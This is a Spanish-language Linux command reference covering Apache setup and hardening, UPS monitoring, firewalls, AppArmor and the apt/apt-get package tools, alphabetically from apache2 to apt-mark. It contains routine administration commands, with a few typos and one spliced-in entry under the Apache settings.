# apache2ctl -k start  (arrancar el servidor. Equivale a /etc/init.d/apache2 start. Tambien acepta las opciones: stop, restart)
# apache2ctl configtest (Otra forma de comprobar la configuración de apache)
# tail -f /var/log/apache2/access.log  (muestra en tiempo real, accesos, ips...)
# tail -f /var/log/apache2/error.log  (muestra los errores de acceso)
Ajustes
1.-
Ajustes mínimos:
# nano /etc/apache2/apache2.conf
Epecificar la carpeta web y el nombre del servidor web:
	DocumentRoot /var/www
	ServerName localhost
2.-
Permisos de la carpeta web:
# chmod -R 755 /var/www && find /var/www -type d -exec chmod 711 {} \;
3.-
mod_evasive:
Descargar mod_evasive
$ http://www.zdziarski.com/blog/wp-content/uploads/2010/02/mod_evasive_1.10.1.tar.gz
Descomprimir y entrar en la carpeta:
$ tar -zxf mod_evasive_1.10.1.tar.gz
$ cd mod_evasive/
Puede que tengamos que instalar:
# apt-get install apache2-prefork-dev
Compilar el módulo:
# apxs2 -i -a -c mod_evasive20.c
Para confirmar que se ha habilitado lo podemos buscar en:
$ ls /usr/lib/apache2/modules/ | grep evasive
mod_evasive20.so
Reiniciar apache
# /etc/init.d/apache2 restart
Para testear su efectividad:
# perl test.pl
Que viene en el mismo paquete descargado. El resultado correcto:
	HTTP/1.1 200 OK
	HTTP/1.1 200 OK
	HTTP/1.1 200 OK
	HTTP/1.1 2...
	HTTP/1.1 403 Forbidden
	HTTP/1.1 403 Forbidden
	HTTP/1.1 403 Forbi ...
Los parámetros por defecto son suficientes en condiciones "normales". Si se precisa afinar más su configuración, pueden añadirse las siguientes lineas al archivo /etc/apache2/httpd.conf:
	<IfModule mod_evasive20.c>
	DOSHashTableSize    3097
	DOSPageCount        1
	DOSSiteCount        50
	DOSPageInterval     1
	DOSSiteInterval     1
	DOSBlockingPeriod   600
	</IfModule>
Que significa que si una página o cualquier objeto de ella, recibe 50 peticiones por segundo cada segundo la IP será bloqueada durante 600 segundos.
Tambien puede instalar de los repositorios:
# apt install libapache2-mod-security2
# a2enmod security2
# systemctl restart apache2
4.-
Para que apache no informe del sistema operativo y versión de apache
# nano /etc/apache2/apache2.conf
Añadir las lineas:
	ServerTokens ProductOnly
	ServerSignature Off
5.-
Ocultar un archivo de la carpeta webapachetop
Comando top [ver] especifico para servidores apache y lanzado al estilo de tail [ver]
# apachetop -f /var/log/apache2/access.log (Monitorear en tiempo real)
# nano /etc/apache2/apache2.conf
Y colocar en su interior:
	<Files archivo_a_ocultar>
	order allow,deny
	deny from all
	</Files>
6.-
Ver peticiones al servidor apache:
# cat /var/log/apache2/access.log | awk '{print($1)}' | sort | uniq -c | sort
# grep "resuming normal operations" /var/log/apache2/error.log | cut -d'[' -f2 | sed -e 's/]//' (La última vez que fué reiniciado)
# ls -od --time-style=+%d-%m-%Y /proc/$(ps axo pid,cmd | grep apache | head -n 1 | sed -e 's/^ *//' | cut -d' ' -f1) | cut -d' ' -f 5 (otra forma)
# (cat /var/log/apache2/*.log; zcat /var/log/apache2/*.gz) | grep "resuming normal operations" | cut -d'[' -f2 | sed -e 's/]//' | sort (Todas las veces que fue reiniciado)
# (cat /var/log/apache2/*.log; zcat /var/log/apache2/*.gz) | grep "resuming normal operations" | wc -l (Cuantas veces se ha reiniciado)
7.-
Crear un directorio web privado:
# nano /etc/apache2/apache2.conf
Agregar el siguiente contenido:
	<Directory /var/www/privado>
	AllowOverride AuthConfig
	</Directory>
Reiniciar apache:
# /etc/init.d/apache2 restart
Crear el archivo .htaccess en el interior del directorio privado:
$ nano /var/www/privado/.htaccess
Agregar el contenido:
	AuthName "Acceso restringido"
	AuthUserFile /var/www/.htpasswd
	AuthType Basic
	require valid-user
Crear el archivo para el usuario con privilegios:
# htpasswd -c /var/www/.htpasswd juan
Entrar la contraseña y confirmación.
Para añadir más usuario con privilegios, sin el parámetro -c:
# htpasswd /var/www/.htpasswd pedro
8.-
Para que las aplicaciones no aparezcan con caracteres extraños y simbolos raros:
# nano /etc/apache2/conf.d/carhset
Y añadir las siguientes lineas:
	AddDefaultCharset UTF-8
	AddDefaultCharset latin1


apache2ctl
[=apachectl] Controlar el funcionamiento y el estado del demonio apache.
$ apache2ctl start (Inicia el demonio. Da error si ya se está ejecutando)
$ apache2ctl stop (lño Detiene)
$ apache2ctl restart (lo reinicia. Si no se está ejecutando, se inicia. Este comando verifica automáticamente los archivos de configuración para detectar los errores más obvios)
$ apache2ctl fullstatus (muestra un informe de estado completo)
$ apache2ctl status (muestra un breve informe de estado. Similar a la opción fullstatus, excepto que se omite la lista de solicitudes que se están atendiendo actualmente)


apacheds
Servidor de directorios basado en Java que implementa el protocolo LDAP y que resulta útil para la gestión de directorios de red.
# apacheds start default (inicia la instancia de ApacheDS llamada default que puede reemplazarse con cualquier otra instancia configurada)
# apacheds stop default (detener una instancia específica de ApacheDS)
# apacheds status default (indica si la instancia "default" está activa o no)


apachetop
Comando top [ver] especifico para servidores apache y lanzado al estilo de tail [ver]
# apachetop -r 10 -f /var/log/apache2/access.log (Monitorear en tiempo real y refrescar datos cada 10 segundos)


apariencia
Tener el escritorio root y de usuario con la misma apariencia . Crear enlaces entre las carpetas que contienen la apariencia de entorno del usuario y las de root:
$ sudo ln -s /home/usuario/.themes /root/.themes
$ sudo ln -s /home/usuario/.icons /root/.icons
$ sudo ln -s /home/usuario/.fonts /root/.fonts


apcupsd
Proporciona administración de energía UPS [Uninterruptible Power Supply] a los productos APC, incluidos la mayoría de los modelos de la serie BackUPS (incluido USB), SmartUPS V/S, SmartUPS (NET/RM) y la serie Matrix. Controla y monitorea el estado del UPS y permite que la computadora funcione durante un período de tiempo específico con energía UPS y luego ejecuta un apagado controlado en caso de una falla de energía prolongada.
# systemctl start apcupsd (activa el monitoreo de energía, manteniendo el UPS en vigilancia para responder ante caídas de voltaje u otros eventos)
# systemctl stop apcupsd (desactiva el monitoreo, por lo que no se realizarán acciones de respaldo en caso de fallas de energía)
# apcaccess status (muestra detalles como el nivel de carga de la batería, tiempo estimado de respaldo, voltaje y otros parámetros importantes)
apcupsd permite configurar el sistema para que se apague automáticamente cuando la batería llegue a un nivel crítico. Esto se define en el archivo de configuración, generalmente ubicado en /etc/apcupsd/apcupsd.conf. Un parámetro clave es MINUTES, que se puede modificar:
# nano /etc/apcupsd/apcupsd.conf
Y poner la linea:
  MINUTES 5
Que hará que el sistema se apague cuando queden 5 minutos de carga de batería.
# apcupsd --killpower (probar cómo respondería el sistema ante un corte de energía real)


apertium
[apertium-en-es...] Traductor de archivos de texto a los legunajes especificados.
$ apertium eng-spa -u -a file_ingles.txt (Mostrando las palabras desconocidas con * y las ambiguas con =)
$ apertium eng-spa text_ingles.txt > traducido.txt


apf
Cortafuegos. Todos los parámetros se configuran en el archivo conf.apf.
# nano /etc/apf/conf.apf
La configuración básica:
	DEVEL_MODE="0" # 1 en pruebas, 0 en producción
	IFACE_IN="eth1" # Interfaces de red
	IFACE_OUT="eth1" # interfaces de red
	IFACE_TRUSTED="eth0" # Si existen interfaces locales
	IG_TCP_CPORTS="21,22,80,110" # Puertos permitidos
	IG_UDP_CPORTS=""IG_UDP_CPORTS="" # Puertos UDP permitidos [si existen]
	IG_ICMP_TYPES="3,5,11" 3 Puertos ICMP permitidos [si existen]
Otros archivos importantes:
/etc/apf/deny_host.rules (ips, rangos, etc denegados)
/etc/apf/allow_host.rules (ips, rangos, etc permitidos)
/var/log/apf_log (Archivo de logs)
# apf -s (arrancar)
# apf -r (reiniciar)
# apf -f (parar)


apg
Generador de contraseñas aleatorias.
$ apg -a 1 -n 8 -m 10 (Incluyendo signos, 8 propuestas de 10 caracteres)
Algunas opciones:
	-a 0  (sin signos especiales [por defecto])
	-m 10 (número mínimo de caracteres [8 por defecto])
	-x 12 (número máximo de caracteres [10 por defecto])
	-M S  (Incluyendo un signo)
	-M N  (Incluyendo un número)
	-M C  (Incluyendo mayúsculas)
	-E aeiou9 (Excluyendo letras y números mencionados)


apitrace
es un conjunto de herramientas para depurar aplicaciones y controladores OpenGL. Incluye una herramienta para generar un seguimiento de todas las llamadas OpenGL que realiza una aplicación y una herramienta para reproducir estos seguimientos e inspeccionar la representación y el estado de OpenGL durante la ejecución del programa. Incluye las herramientas eglretrace, glretrace y gltrim
$ apitrace trace -o aplicacion.trace brave-browser (crea un archivo aplicacion.trace que contiene las llamadas de OpenGL que realiza la aplicación brave-browser)
$ glretrace aplicacion.trace (ejecuta la traza grabada y muestra visualmente cómo se renderiza en la pantalla)
            /opt/brave.com/brave/brave
            Rendered 0 frames in 0.0115168 secs, average of 0 fps
$ gltrim -o aplicacion_trim.trace aplicacion.trace (elimina llamadas redundantes de aplicacion.trace, generando una traza más optimizada [aplicacion_trim.trace], que es útil para analizar solo los eventos gráficos esenciales)
$ apitrace dump mi_aplicacion.trace (muestra detalles sobre cada llamada en la traza, lo cual es útil para el análisis de rendimiento y depuración)
$ apitrace info aplicacion.trace (muestra información de los archivos de traza)


apkinfo
Herramienta que muestra información de metadatos sobre archivos APK de Android tales como información de paquete, versión y nombre.
$ apkinfo miapp.apk (mostrar información general sobre un archivo)
$ apkinfo --package miapp.apk (ver solo el nombre del paquete)
$ apkinfo --version miapp.apk (ver solo la versión)
$ apkinfo --permissions miapp.apk (ver los permisos solicitados por el paquete)
$ apkinfo --manifest miapp.apk (ver el contenido del AndroidManifest.xml)
$ apkinfo --all miapp.apk (obtener una vista completa de la información disponible incluyendo actividades, servicios, componentes, recursos, etc)


aplay
Relacionado con ALSA
# aplay /usr/share/sounds/alsa/Front_Center.wav  (prueba de alsa)
# aplaymidi -l   (lista los puertos midi)
$ aplay -l (saber el modelo de la tarjeta de sonido)
# aplaymidi -p 65 archivo.mid  (reproduce el mid sin timidity)
# aplay -fdat /dev/sda  (Escuchar el sonido del disco duro)


aplaymidi
Utilidad de línea de comandos que reproduce los archivos MIDI especificados en uno o más puertos del secuenciador ALSA
$ aplaymidi -l (imprime una lista de posibles puertos de salida)
$ aplaymidi -p 14:0 archivo.mid


apparix
Permite marcar directorios y luego saltar a ellos usando la marca. Por defecto apparix actúa como sustituto de cd y puede ser usado de la misma manera.
$ apparix
[apparix] created bookmark file /home/pep/.apparixrc
[apparix] created expansion file /home/pep/.apparixexpand
$ apparix --shell-examples (muestra el código que ha entrarse en .bashrc para que los atajos "to" y "bm" tengan efecto)
Ejemplo:
  $ cd Documentos/bash
  [~/Documentos/bash]$ apparix --add-mark bash (añadir directorio un marcador "bash" en bookmarks.)
$ apparix -l (ver listados de los directorios guardados para un acceso rápido)
$ apparix -u 3 (eliminar del listado el número 3)


apparmor
Módulo de seguridad del kernel. Los perfiles estan: /etc/apparmor.d/
# apparmor_status (Ver estado)
# aa-complain /etc/apparmor.d/* (Activar todos los perfiles en modo complain, es decir, que no se bloquea ninguna aplicación y sólo registra sus eventos)
# aa-complain /usr/bin/firefox (Lo mismo activandolo para una aplicación)
# aa-genprof /usr/bin/firefox (Crear un perfil para una aplicación. Preguntará unos datos. Sin cerrar la terminal, abrir firefox y usar la aplicación como normalmente se usa. Al rato, volver a la terminal y pulsar "S". Se mostrará todos los ficheros a los cuales firefox ha accedido solicitando qué acción llevar a cabo)
# cat /etc/apparmor.d/usr.lib.firefox-3.0.10.firefox.sh (Consultar el perfil creado. Substituir versión por la correcta)
# apparmor_parser -R < /etc/apparmor.d/usr.lib.firefox-3.0.10.firefox.sh (Desactivar restricciones a un perfil)


apport
Herramienta encargada de capturar cualquier error que se produzca en una aplicación y recopilar información sobre el estado del sistema operativo en el momento de producirse el fallo. Para desactivarlo:
# nano /etc/default/apport
enable=0
También:
# service apport start forse_start=0
Para activarlo substituir el 0 por un 1


appres
El programa appres imprime los recursos vistos por una aplicación (o subjerarquía de una aplicación) con los nombres de clase e instancia especificados. Puede  para determinar qué recursos cargará un programa concreto. Por ejemplo
$ appres tty
$ appres  XTerm.VT100  xterm.vt100  -1 (listará los recursos de los widgets de la jerarquía xman topBox específicos de la jerarquía [-1])


apprise
Permite enviar notificaciones a más de 70 servicios. Con énfasis en: Apprise API, AWS SES, Telegram, Discord, Slack,amazon SNS, Gotify, Google Chat, Faast, IFTTT, Matrix, Microsoft Teams, etc. Hay un pequeño Administrador de configuración integrado al que se puede acceder opcionalmente a través de su navegador web, lo que le permite crear y guardar tantas configuraciones como desee. Cada configuración se diferencia por una {KEY} única que usted decide.
$ apprise -t "Título de la Notificación" -b "Este es el mensaje de la notificación" slack://TOKEN_DE_AUTENTICACION/CANAL (envía una notificación a Slack usando el TOKEN_DE_AUTENTICACION y el canal especificado)
$ apprise -t "Aviso Importante" -b "Este es el mensaje enviado a múltiples servicios" \
    tgram://TOKEN/CHAT_ID \
    discord://WEBHOOK_ID/WEBHOOK_TOKEN (enviará el mensaje a ambos servicios de notificación)
$ apprise -t "Notificación desde archivo" -b "Este mensaje usa una configuración externa" --config archivo_config.yml (configurar varios servicios en un archivo y luego utilizarlo para enviar notificaciones de manera centralizada)
Nota.- el archivo archivo_config.yml contiene las URL de los servicios configurados
$ apprise -t "Prueba de Notificación" -b "Este es un mensaje de prueba" -v (muestra información detallada del proceso de envío y si los servicios están configurados correctamente)


approx
Proxy de paquetes para sistemas Debian que ayuda a almacenar en caché los paquetes .deb, lo cual ahorra ancho de banda y reduce los tiempos de descarga al instalar o actualizar en múltiples máquinas dentro de una red local.  Cada paquete se descarga desde un sitio remoto solo una vez, independientemente de cuántos clientes locales lo instalen. Las ubicaciones de los repositorios solo deben cambiarse en el archivo de configuración de approx, no en el archivo /etc/apt/sources.list de cada cliente. Primero configurar el servidor approx:
# nano /etc/approx/approx.conf
Y añadir las lineas deseadas. Cada línea en este archivo indica un alias para un repositorio.
         debian   http://deb.debian.org/debian
         security http://security.debian.org/debian-security
         max_age 30d
En este caso, debian y security son alias que apuntan a los repositorios oficiales. approx almacenará en caché los paquetes que se descarguen desde estos alias. La linea "max_age" es para hacer que los paquetes caduquen en 30 días.
# systemctl start approx (iniciar el servicio)
# systemctl status approx (confirmar si está activo)
Después en cada máquina cliente de la red, se modifica el archivo /etc/apt/sources.list para que apunte al servidor approx. Por ejemplo si el servidor proxy tiene la IP 192.168.1.100, el archivo podría verse así:
        deb http://192.168.1.100:9999/debian stable main
        deb http://192.168.1.100:9999/security stable/updates main
Ahora, cada vez que se descarguen paquetes desde este cliente, approx almacenará los paquetes en caché en el servidor.
# approx-gc (elimina los paquetes que ya no son necesarios)
# tail -f /var/log/approx.log (ver los registros de actividad)


appstream
Permite obtener información detallada de componentes de software. El proyecto AppStream proporciona facilidades para acceder y transformar fácilmente estos metadatos, así como algunos servicios adicionales para permitir la creación de centros de software con numerosas funciones y aplicaciones similares. Este paquete proporciona herramientas para generar, mantener y consultar el conjunto de datos de AppStream del software instalado y disponible, y permite la integración con el administrador de paquetes APT.
$ appstreamcli search firefox (buscar información sobre un paquete)
$ appstreamcli search firefox --details (salida más detallada sobre firefox)
# appstreamcli refresh (refescar la memoria de los metadatos actuales)
$ appstreamcli status (información del estado de todos los metadatos disponibles)


appstream-util
# appstream-util add-language es /mi_app.appdata.xml (con un archivo AppStream [.appdata.xml] agregar una nueva traducción de idioma [es] en el archivo especificado)
# appstream-util appdata-to-news /mi_app.appdata.xml (genera un archivo de noticias a partir de las versiones y las notas especificadas en el archivo AppStream)
# appstream-util dump /mi_app.appdata.xml (desglosa la estructura del archivo, mostrando campos como nombre, descripción, licencias y versiones)
# appstream-util validate /mi_app.appdata.xml (muestra advertencias o errores si el archivo no cumple con las especificaciones necesarias)
# appstream-util list-languages /mi_app.appdata.xml (lista los idiomas integrados en el archivo)


apropos
Busca utilidades relacionadas con lo especificado.
$ apropos jpeg
$ apropos “copy files”  (busca comandos relacionados)


apsfilter
Facilita la impresión de muchos formatos de archivo [gzip, bzip2, html, tiff, pdf, ascii, jpeg...]. Incluye las herramientas aps2file, apsfilter-bug, apspreview y apsfilterconfig.
# apsfilterconfig (abre el asistente que permite seleccionar el tipo de impresora, configurar los controladores y ajustar opciones como el tamaño del papel y la resolución)
# aps2file archivo.ps salida (convierte archivo.ps en el formato de salida especificado y lo guarda como salida)
# apspreview archivo.ps (vista previa, mostrando el archivo como se verá impreso)
# apsfilter-bug (inicia un asistente que recopila información sobre el sistema y ayuda a generar un informe detallado del problema para ser enviado a los desarrolladores)


apt
Aplicación que unifica las opciones y parámetros de apt-cache y apt-get. Tambien cuenta con una barra de progreso. Tiene casi los mismo parametros que el comando apt-get.
# apt list (Muestra todos los paquetes disponibles)
# apt list --installed (Muestra todos los paquetes instalados)
# apt list --upgradable (Muestra todos los paquetes actualizables)
$ apt search paquete (Buscar un paquete)
# apt update (Actualiza el listado de paquetes)
# apt upgrade (Actualiza todos los paquetes del sistema. No elimina ninguno)
# apt dist-upgrade (Lo mismo pero si que elimina de forma inteligente)
# apt install paquete (Instala un paquete)
# apt install -f (Intenta corregir problemas como paquetes rotos y otros problemas de dependencias)
# apt install -f -o Dpkg::Options::="--force-overwrite" (Lo mismo que el anterior pero le indicamos a dpkg que sobreescriba ficheros que más de un paquete pretenden instalar)
# apt remove paquete (Suprime un paquete)
# apt edit-sources (Edita el sources.list)
# apt show nano (ver detalles de un paquete)
# apt modernize-sources (actualizar los repositorios a la nueva versión de apt)
# apt update --audit (comprobar si funcionan correctamente y no producen errores)
1- significado de algunas salidas de apt update
   Hit (significa que apt comprobó las marcas de tiempo en la lista de paquetes, éstas coinciden y no hay cambios.)
   Ign (significa que no hay cambios en el archivo de índice pdiff, no se molestará en descargarlo de nuevo.)
   Obj (en la versión del paquete no hay cambios respecto a la versión anterior)
   Get (hubo cambios y se descargarán.)
2.-
Ejemplo de entrar en los repositorios la url para que el paquete Firefox sea directamente el generado por Mozilla
# wget -q https://packages.mozilla.org/apt/repo-signing-key.gpg -O- | sudo tee /etc/apt/keyrings/packages.mozilla.org.asc > /dev/null (descargar las claves de validacion de los paquetes)
# gpg -n -q --import --import-options import-show /etc/apt/keyrings/packages.mozilla.org.asc | awk '/pub/{getline; gsub(/^ +| +$/,""); if($0 == "35BAA0B33E9EB396F59CA838C0BA5CE6DC6315A3") print "\nLa huella digital coincide ("$0").\n"; else print "\nError de verificación: la huella digital no coincide con la esperada.\n"}' (comprobar que la clave es correct)
Añadir al sources list la linea:
# nano /etc/apt/sources.list
        deb [signed-by=/etc/apt/keyrings/packages.mozilla.org.asc] https://packages.mozilla.org/apt mozilla main
# apt modernize-source (actualizar los repositorios a la nueva versión de apt)
# apt update
# apt -y install firefox firefox-l10n-es-es (instalar)


apt-cdrom
Agregar un cd-rom archivo sources.list.
# apt-cdrom -d /home/user/mycdrom add


apt-cache
Empleado para buscar en la base de datos provista por la lista de fuentes [dpkg solo busca los contenidos de los paquetes instalados].
# apt-cache search paquete       (Busca en la cache paquete)
# apt-cache show paquete         (Muestra la descripción completa del paquete)
# apt-cache showpkg paquete   (Muestra su relación con otros paquetes)
# apt-cache depends paquete    (Muestra las dependencias del paquete)
# apt-cache rdepend paquete     (Muestra dependencias inversas del paquete)
# apt-cache policy paquete       (Ver vesiones de paquetes y la versión instalada)
# apt-cache search dummy | grep -i "dummy package" | wc -l (identificar cuantos paquetes de transición estan instalados en el sistema)
# apt-cache show login | grep Essential (ver si determinado paquete es esencial)


apt-clone
Este paquete clona/restaura los paquetes instalados en un sistema por apt con el sources-list y las claves de los repositorios.
# apt-clone clone paquetes (los guarda en el archivo paquetes)
# apt-clone info paquetes (mostrar información sobre el archivo creado)
# apt-clone restore paquetes (restaurar los paquetes)


apt-config
Programa interno utilizado por varias partes de la suite APT para proporcionar una configurabilidad consistente. Accede al archivo de configuración principal /etc/apt/apt.conf de forma que sea fácil de usar por aplicaciones con scripts.
# apt-config dump (muestra la configuración establecida)


apt-config-auto-update
Permite que APT está configurado para actualizar la caché de forma automática. Esto significa que, cada vez que se instala o actualiza un paquete, APT verificará la disponibilidad de nuevas versiones sin tener que actualizar manualmente la caché con comandos como apt update. Este paquete no tiene un comando ejecutable como tal. Su función es mantener la caché de APT actualizada automáticamente. Genera archivos de configuración en [los comentarios son mios]:
# nano nano /etc/apt/apt.conf.d/20auto-upgrades
  # Asegura que las listas de paquetes se actualicen regularmente:
  APT::Periodic::Update-Package-Lists "1";
  # Que se instalen automáticamente las actualizaciones disponibles y los parches de seguridad críticos:
  APT::Periodic::Unattended-Upgrade "1";


apt-dater
Forma fácil para administrar actualizaciones de paquetes en una gran cantidad de hosts remotos mediante SSH y apt-dater-host. Incluye la apalicación adsh que es un programa auxiliar interno para apt-dater y no está destinado a utilizarse. Antes de usar, es necesario configurarlo correctamente:
# ssh-keygen -t rsa -b 4096 -C "tu_email@example.com" (generar clave SSH en el servidor)
# ssh-copy-id -i ~/.ssh/apt-dater usuario@host1 (distribuir la clave pública a los hosts que se desean gestionar)
# ssh-copy-id -i ~/.ssh/apt-dater usuario@host2
En cada host, crear un usuario específico para las actualizaciones:
# nano /etc/sudoers
Y añadir la linea:
  USER ALL=(ALL) NOPASSWD: /usr/bin/apt-get, /usr/bin/needrestart
Crear archivos de configuración: ~/.config/apt-dater/apt-dater.conf, ~/.config/apt-dater/hosts.conf (contiene todos los hosts que se desea administrar) y ~/.config/apt-dater/screenrc
$ apt-dater (actualizar todos los hosts. iniciará sesión en los hosts especificados y ejecutará "apt-get update" y "apt-get upgrade" en cada uno de ellos)
$ apt-dater --auto-refresh (actualizar solo los paquetes necesarios)
$ apt-dater -r (crear un informe XML de la última actualización)
$ apt-dater -n -r (evitar que se refresquen los hosts antes de crear el informe XML)
Configuración avanzada:
$ ~/.config/apt-dater/apt-dater.conf
...
[Paths]
HostsFile=$XDG_CONFIG_HOME/apt-dater/hosts.conf
StatsDir=$XDG_DATA_HOME/apt-dater
[SSH]
Cmd=/usr/bin/ssh
SpawnAgent=true
AddKeys=~/.ssh/apt-dater
[Commands]
CmdRefresh=apt-dater-host refresh
CmdUpgrade=apt-dater-host upgrade
CmdInstall=apt-dater-host install %s
...


apt-doc
Muestra información sobre el comando apt. Colocar en el navegador: usr/share/doc/apt-doc/guide.es.html


apt-extracttemplates
[apt-utils]. Toma un paquete Debian como entrada y escribirá en un directorio temporal o en el especificado con -t, los scripts de configuración y archivos de plantilla asociados. Para cada paquete aprobado que contenga scripts de configuración y plantillas, se generará una línea de salida en el formato: package, version, template-file y config-script.
$ apt-extracttemplates cups_2.2.1-8+deb9u5_amd64.deb
cups 2.2.10-6+deb10u3 /tmp/user/1000/cups.template.3UbTXr /tmp/user/1000/cups.config.HtrJO2


apt-fast
[axel o aria]. Paquete que incrementa la velocidad de descarga de paquetes respecto de apt-get mediante el uso de axel [ver] o aria. Descargar el scrpt de http://www.mattparnell.com/linux/apt-fast/apt-fast.sh o via github de https://github.com/ilikenwf/apt-fast. Para reconfigurar el paquete:
# dpkg-reconfigure apt-fast
Donde se podrá apreciar su velocidad es principalmente con los argumentos "update", "upgrade" y "dist-upgrade".
# apt-fast update


apt-file
Buscar un paquete que contiene un fichero o ver el contenido de un paquete. Una vez instalado, para realizar la caché,  lanzar en primer lugar:
# apt-file update
# apt-file search ifconfig
# apt-file list ifconfig
# apt-file list util-linux | grep -E '/bin/|/sbin/' (ver los ejecutables de un paquete)


apt-ftparchive
Genera ficheros de índice de paquetes .deb
$ apt-ftparchive contents /var/cache/apt/archives/python* (genera un fichero de contenidos a partir del directorio especificado)
$ apt-ftparchive packages directorio | gzip > Packages.gz (crear un fichero «Packages» comprimido para un directorio que contenga paquetes deb)


apt-get
[aptitude y apt-cache]. Gestor de programario de distribuciones Debian. Listtado del historial de instalaciones y desinstalaciones en /var/log/apt/history.log
# apt-get update    (Actualiza la lista de paquetes)
# apt-get upgrade   (Actualiza todos los paquetes instalados)
# apt-get upgrade paquete     (Solo actualiza “paquete”)
# apt-get dist-upgrade    (Actualiza la distribución)
# apt-get install paquete (Instala paquetes con resolución de depencias)
# apt-get install paquete -y (instalar paquete sin pedir confirmación)
# apt-get install --reinstall  paquete      (Reinstala un paquete)
# apt-get install --only-upgrade firefox-esr (actualiza un solo paquete)
# apt-get autoremove  (Borra paquetes huérfanos)
# apt-get download paquete (descarga el deb del paquete especificado)
# apt-get remove paquete        (Elimina un paquete)
# apt-get remove --purge paquete  (Desinstala con archivos de configuración)
# apt-get remove $(deborphan)  (Elimina huerfanos. lanzar varias veces)
# apt-get clean        (Elimina caché)
# apt-get autoclean  (lo mismo de versiones antiguas de paquetes)
# apt-get -f install   (sin especificar paquete, para reparar la aplicación)
# apt-get -s install paquete        (simula la instalación)
# apt-get --compile source paquete  (baja las fuentes, compila y crear un .deb)
# apt-get check          (Verifica dependencias rotas)
# apt-get build-dep paquete (instalar las dependencias necesarias para poder compilar un paquete fuente)
# apt-get install network-manager=0.9.1.90-0ubuntu3 (version concreta)
# apt-mark hold network-manager (Mantener una version concreta)
# apt-get source paquete (buscar un paquete fuente para ser compilado)
# apt-rdepends paquete (muestra todas las dependencias)
# apt-rdepends -b paquete (muestra las dependencias directas)
# apt-rdepends -f paquete  (muestra version y estado del paquete)
# apt-get --yes install paquete (Responder “si” a preguntas de la instalación)
# aptitude search ~ilinux-image (Lista los kernels instalados)
# aptitude search ~i -F %p (Lista los paquetes instalados)
# apt-setup                              (Crea un sources.list optimizado)
# add-apt-repository ppa:repositorio   (añadir un repositorio ppa)
# ppa-purge ppa:repositorio   (suprimirlo. Precisa el script ppa-purge))
# apt-get install --no-install-recommends paquete (No instalar los paquetes recomendados que no sean dependencias fuertes)
Algunos archivos relacionados:
	/etc/apt/sources.list (Fichero de repositorios.)
	/var/cache/apt/archives (Caché de los paquetes .deb instalados)
	/var/log/apt/term.log (Archivo de logs de la aplicación)
1.-
Para resolver problemas con  /var/lib/apt/lists/*  lanzar:
# rm /var/lib/apt/lists/* -vf
Y luego:
# apt-get update
2.-
# apt-get -o "Acquire::Check-Valid-Until=false" update   (Saltarse el validador  que verifica la fecha de caducidad del archivo “Release” de debian [Error ” Release file expired, ignoring file”])
3.-
Añadir repositorios de distintas ramas en debian.
Incluir en el sources.list los repositorios de las distintas ramas:
# nano sources.list
	## Debian Testing
	deb http://ftp.de.debian.org/debian/ testing main contrib non-free
	deb-src http://ftp.de.debian.org/debian/ testing main contrib non-free
	## seguridad Debian Testing
	deb http://security.debian.org/ testing/updates main contrib non-free
	deb-src http://security.debian.org/ testing/updates main contrib non-free
	## Debian Unstable
	deb http://ftp.us.debian.org/debian unstable main non-free contrib
	## Debian experimental
	deb http://ftp.fr.debian.org/debian experimental main non-free contrib
Editar o crear el fichero:
# nano /etc/apt/apt.conf
Con el siguiente contenido:
	APT::Default-Release “testing”;
	APT::Cache-Limit 55000000;
	Apt::Get::Purge;
	APT::Clean-Installed;
	APT::Get::Fix-Broken;
	APT::Get::Fix-Missing;
	APT::Get::Show-Upgraded “true”;
Con el que establecemos las siguientes caracteristicas: Definir Debian Testing como rama principal,Limitar la cache utilizada en el proceso de actualización,Borrar archivos de configuración de los paquetes desinstalados y Arreglar el sistema en caso de detectar dependencias rotas.
Editar el archivo preferences:
# nano /etc/apt/preferences
Con el contenido:
	Package: *
	Pin: release a=testing
	Pin-Priority: 900
	Package: *
	Pin: release a=unstable
	Pin-Priority: 600
	Package: *
	Pin: release a=experimental
	Pin-Priority: 50
Que tiene por significado que si el paquete existe en la rama testing se enstalará este, en caso contrario, si existe en unstable se instalará el unstable y sólo si no existe en las otras dos, se instalará de la versión experimental.
También podemos especificarlo en el comando:
# apt-get install libreoffice/unstable (Firefox se instalará de la rma unstable, pero las dependencias, se buscarán en primer lugar en la rama testing)
# apt-get -t unstable install firefox (Tanto firefox como las dependencias se instalarás de la rama unstable)
4.-
Instalación de aplicaciones sin conexión a internet. Ha de instalarse en dos equipos: el que tiene conexión y en el que no la tiene. Esta aplicación tiene muchas limitaciones ya que no instala dependencias por lo que puede usarse en pocos casos.
En el equipo sin conexión:
# apt-offline set apt.sig --update --upgrade --install-packages PAQUETE (genera el archivo apt.sig que ha de trasladarse al equipo que tiene conexión)
En el equipo conexión:
# apt-offline get apt.sig --threads 5 --bundle offline.zip (Crea el archivo offline.zip que se traslada al equipo sin conexión)
Otra vez en el equipo sin conexión:
# apt-offline install offline.zip
# apt-get install PAQUETE (Instalación del paquete)
5.-
Instalar aplicaciones de arquitectura 386 en equipos amd64:
# nano /etc/apt/sources.list
Añadir las lineas:
	deb http://ftp.debian.org/debian/ wheezy-updates main contrib
	deb http://http.us.debian.org/debian/ wheezy contrib non-free main
# apt-get update
# apt-get upgrade
Activar multiarquitectura:
# dpkg --add-architecture i386
# apt-get update
Instalar librerías base para los sistemas de 32 bits:
# apt-get install libc6:i386
6.-
Configurar apt para que no descargue traducciones:
# nano /etc/apt/apt.conf.d/99Translations
Con el siguiente contenido:
	Acquire::Languages "none";


apt-key
Herramienta para la gestion de un anillo de claves de repositorios seguros. El anillo de claves se guarda en el archivo /etc/apt/trusted.gpg
# apt-key list (listar todas las claves del anillo)
# apt-key net-update (Actualizar utilizando la red)
# apt-key exportall (Exportar todas las claves)
# apt-key export xxxxxx (Exportar una clave)
# apt-key del xxxxx (Eliminar una clave)


apt-listbugs
Herramienta que muestra errores críticos de los paquetes nombrados.
$ apt-listbugs list chromium


apt-listchanges
Herramienta que muestra qué ha cambiado en una nueva versión de un paquete Debian en comparación con la versión instalada en el sistema.
$ apt-listchanges -a paquete.deb


apt-listdifferences
Mostrará las diferencias o parches, entre las fuentes de todos los paquetes a medida que se actualizan. Esto hace posible revisar fácilmente los cambios de origen que se han incluido en las nuevas actualizaciones de paquetes Debian.
$ apt-listdifferences --initialize (descargar la base de datos en función de los paquetes instalados)
$ apt-listdifferences --apt (mostrar lista de paquetes, uno por línea, por pantalla)
$ apt-listdifferences firefox-esr (de la aplicación especificada)


apt-mark
